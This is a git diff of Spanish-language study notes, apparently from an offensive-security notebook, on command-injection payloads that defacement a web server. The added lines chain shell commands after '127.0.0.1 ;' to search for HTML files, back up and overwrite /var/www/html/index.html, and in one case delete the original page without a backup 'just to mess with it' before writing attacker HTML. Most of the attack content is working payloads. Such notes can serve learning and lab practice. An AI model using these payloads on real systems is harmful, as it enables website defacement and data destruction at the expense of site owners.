@@ -48,16 +48,30 @@ etc
 
 ````
 
-- Algo un poco mas complejo como un `defacement` se podría ver algo así:
+Algo un poco mas complejo como un `defacement` se podría ver algo así:
+
+1. Buscar por algún archivo con la extensión `*.html` / buscar directamente por el `*.index.html` / mapear directorio default para hosting de página. 
 
 ````sh
-127.0.0.1 ; cp /var/www/index.html /var/www/index.bak && echo "Hola mundo, soy Fz3r0" > /var/www/index.html &
+# Option 1
+127.0.0.1 ; find / -type f -name "*.html" &
+
+# Option 2
+127.0.0.1 ; ls /var/www
+
 ````
 
-- O algo todavía más complejo, esto ya es un código HTML para un buen defacement:
+2. Crear un nuevo `index.html` con el defacement utilizando un `one-liner`, el original se guarda en un backup `.bak`:
 
 ````sh
-127.0.0.1 ; cp /var/www/index.html /var/www/index.bak && echo '<!DOCTYPE html><html><head><title>Este es un título de prueba</title><style>body{background-color:black;color:white;}h1{color:yellow;}h2{color:cyan;}</style></head><body><h1>Este es el titulo Fz3r0</h1><h2>Este es el titulo 2 Fz3r0</h2><p style="color:red;">Este es el contenido en rojo y yo soy Fz3r0</p><img src="https://ejemplo.com/imagen.jpg" alt="Imagen de ejemplo"></body></html>' > /var/www/index.html &
+127.0.0.1 ; cp /var/www/html/index.html /var/www/html/index.bak && echo "Hola mundo, soy Fz3r0" > /var/www/html/index.html &
+
+````
+
+- O algo todavía más complejo, esto ya es un código HTML para un buen defacement (aquí borramos la página original sin guardar backup, solo por chingar):
+
+````sh
+127.0.0.1 ; rm /var/www/html/index.html && echo '<!DOCTYPE html><html><head><title>Este es un título de prueba</title><style>body{background-color:black;color:white;}h1{color:yellow;}h2{color:cyan;}</style></head><body><h1>Este es el titulo Fz3r0</h1><h2>Este es el titulo 2 Fz3r0</h2><p style="color:red;">Este es el contenido en rojo y yo soy Fz3r0</p><img src="https://ejemplo.com/imagen.jpg" alt="Imagen de ejemplo"></body></html>' > /var/www/html/index.html &
 
 ````
 
